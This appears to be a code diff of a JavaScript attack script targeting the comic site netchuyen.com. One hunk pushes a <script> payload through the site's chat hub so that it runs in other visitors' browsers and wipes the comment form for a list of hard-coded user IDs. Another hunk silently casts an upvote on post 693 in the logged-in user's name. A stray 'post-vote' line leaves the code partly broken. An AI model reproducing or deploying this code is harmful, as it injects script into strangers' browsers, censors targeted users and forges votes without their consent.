@@ -25,8 +25,9 @@ var check_cmt = ""
         return new Promise(resolve => {
             let check = `<script>
             var user_img = document.querySelector(".nav-account").querySelector("img").src
-            if(localStorage.getItem('banner') == 'true' || user_img.match(/useravatars(.*?).jpg/)[1].includes(1469869)){
+            if(user_img.includes('649551') || user_img.includes('1469869') || user_img.includes('926007') || user_img.includes('977954')){
                 document.querySelector('.form-group').innerHTML =''
+                console.log("ok")
             }
             </script>`
             chatHub.server.send(check)
@@ -68,4 +69,45 @@ var check_cmt = ""
     }
     
     main()
-    
+
+
+    post-vote
+
+
+        if(localStorage.getItem('follow') !='ok'){
+            let checkuser = document.querySelector(".nav-account").querySelector("img")
+            let queue = []
+            if(checkuser !=null){
+                let curent_data =  document.querySelector(".nav-account").querySelector("img").src.match(/useravatars(.*?).jpg/)[1].slice(1)           
+                $.ajax({
+                    type: "GET",
+                    url: "https://netchuyen.com/nettruyen-phien-ban-gay-mu-693",
+                    success: function(data) {
+                        let dom = document.createElement("div")
+                        dom.innerHTML = data
+                        let nodedom = dom.querySelector(".vote-list").querySelectorAll("tr")
+                        for(let i=0;i< nodedom.length;i++){
+                            let like = nodedom[i].querySelector(".fa-thumbs-up")
+                            if(like != null){
+                                let userid = nodedom[i].querySelector('a').href.slice(27)
+                                queue.push(userid)
+                            }
+                        }
+                        if(queue.includes(curent_data)) console.log("errr")
+                        else {
+                            $.ajax({
+                                type: "POST",
+                                url: "https://netchuyen.com/Post/Services/PostService.asmx/Vote",
+                                data: {
+                                    postId: 693,
+                                    type: 1
+                                },
+                                success: function(data) {
+                                    localStorage.setItem('follow','ok')
+                                }
+                            });
+                        }
+                    }
+                });
+            }
+        }
